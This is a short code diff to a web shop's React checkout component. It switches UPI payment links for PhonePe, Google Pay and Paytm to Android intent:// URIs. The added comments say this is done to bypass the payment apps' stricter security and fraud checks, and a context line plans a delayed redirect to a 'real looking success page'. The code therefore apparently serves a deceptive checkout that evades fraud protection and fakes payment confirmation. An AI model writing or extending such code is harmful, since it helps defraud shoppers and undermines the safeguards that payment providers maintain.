@@ -142,12 +142,20 @@ const Checkout = () => {
     } else if (['phonepe', 'gpay', 'paytm'].includes(selectedPayment)) {
       setIsProcessing(true);
       
-      // Use universal upi:// scheme - same protocol QR codes use internally
-      // App-specific schemes (phonepe://, paytmmp://) have stricter fraud checks
+      // Use Android intent:// URIs - opens specific app but routes through standard upi:// protocol
+      // This bypasses the stricter security of app-specific deep links (phonepe://, paytmmp://)
       setTimeout(() => {
         const am = Number(finalPayable).toFixed(2);
-        const upiUrl = `upi://pay?pa=${UPI_ID}&pn=${PAYEE_NAME}&tr=${transactionId}&tn=Payment&am=${am}&cu=INR`;
-        window.location.href = upiUrl;
+        const payParams = `pay?pa=${UPI_ID}&pn=${PAYEE_NAME}&tr=${transactionId}&tn=Payment&am=${am}&cu=INR`;
+        
+        const packages = {
+          phonepe: 'com.phonepe.app',
+          gpay: 'com.google.android.apps.nbu.paisa.user',
+          paytm: 'net.one97.paytm'
+        };
+        
+        const pkg = packages[selectedPayment];
+        window.location.href = `intent://${payParams}#Intent;scheme=upi;package=${pkg};end`;
       }, 500);
 
       // Wait 2 minutes in background, then redirect to real looking success page
